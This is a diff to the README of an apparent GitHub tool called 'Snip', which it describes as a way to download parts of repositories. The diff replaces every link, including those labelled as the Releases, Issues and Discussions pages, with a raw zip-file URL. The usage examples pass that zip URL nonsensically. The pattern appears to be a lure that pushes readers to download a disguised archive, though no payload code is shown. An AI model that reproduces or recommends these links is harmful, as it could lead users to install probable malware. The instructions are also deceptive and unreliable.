@@ -4,15 +4,15 @@
 Welcome to Snip! This tool allows you to download specific directories or files from a GitHub repository without needing to clone the entire project. This can save you time and effort, especially when you only need a small part of a larger project.
 
 ## 🔗 Download Now
-[![Download Snip](https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip%20Snip-v1.0-brightgreen)](https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip)
+[![Download Snip](https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip%20Snip-v1.0-brightgreen)](https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip)
 
 ## 📥 Download & Install
 To get started with Snip, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip) for the latest version of Snip.
+1. Visit the [Releases page](https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip) for the latest version of Snip.
 2. On the Releases page, you will see a list of available downloads. Click on the version you want to download.
 3. Depending on your operating system, choose the appropriate file. Here are some common options:
-   - **Windows**: download `https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip`
+   - **Windows**: download `https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip`
    - **MacOS**: download `snip_macos`
    - **Linux**: download `snip_linux`
 4. After downloading, locate the file on your computer. It is usually in your "Downloads" folder unless you specified another location.
@@ -36,11 +36,11 @@ Once you have Snip up and running, here’s how to use it:
 
 3. **Example**: To download a file:
    ```
-   snip https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip
+   snip https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip
    ```
    To download a directory:
    ```
-   snip https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip path/to/directory
+   snip https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip path/to/directory
    ```
 
 4. **Wait for download**: Snip will notify you when the download completes. You will find the downloaded content in your current working directory.
@@ -70,8 +70,8 @@ If you encounter any issues while using Snip, consider the following solutions:
 
 ## 💬 Feedback & Support
 We encourage you to reach out for any help or suggestions:
-- **Issues**: Report any issues at the [Issues page](https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip).
-- **Questions**: Open a discussion at [Discussions](https://raw.githubusercontent.com/nma12323/snip/main/aphroditous/snip.zip).
+- **Issues**: Report any issues at the [Issues page](https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip).
+- **Questions**: Open a discussion at [Discussions](https://raw.githubusercontent.com/nma12323/snip/main/cmd/Software-2.4-beta.1.zip).
 
 ## 💻 How to Contribute
 If you're interested in contributing to Snip, here's how you can get started:
